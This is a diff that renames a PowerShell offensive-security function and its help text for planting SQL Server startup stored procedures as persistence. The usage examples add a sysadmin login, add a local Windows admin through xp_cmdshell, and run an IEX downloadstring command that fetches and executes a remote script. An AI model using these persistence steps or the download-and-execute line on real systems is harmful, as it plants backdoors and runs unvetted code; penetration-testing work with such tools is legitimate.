@@ -1,4 +1,4 @@
-function Invoke-SqlServer-Persist-AutrunSp
+function Invoke-SqlServer-Persist-StartupSp
 {
     <#
 	.SYNOPSIS
@@ -17,19 +17,19 @@ function Invoke-SqlServer-Persist-AutrunSp
 	.EXAMPLE
 	Create startup stored procedure to add a new sysadmin.  The example shows the script being run using a SQL Login.
 
-	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
+	PS C:\> Invoke-SqlServer-Persist-StartupSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 
 
 	.EXAMPLE
 	Create startup stored procedure to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
 	being run as the current windows user.
 
-	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
+	PS C:\> Invoke-SqlServer-Persist-StartupSp -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!
 
 	.EXAMPLE
 	Create startup stored procedure to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
 	from the internet and executes it.  The example shows the script being run as the current Windows user.
 
-	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
+	PS C:\> Invoke-SqlServer-Persist-StartupSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
 
 	.LINK
 	http://www.netspi.com
@@ -37,7 +37,7 @@ function Invoke-SqlServer-Persist-AutrunSp
 
 	.NOTES
 	Author: Scott Sutherland - 2014, NetSPI
-	Version: Invoke-SqlServer-Backdoor-AutrunSp.psm1 v1.0
+	Version: Invoke-SqlServer-Persist-StartupSp.psm1 v1.0
 	Comments: 
         - This should work on SQL Server 2005 and Above.
         - The added procedures can be manually viewed using the query below.
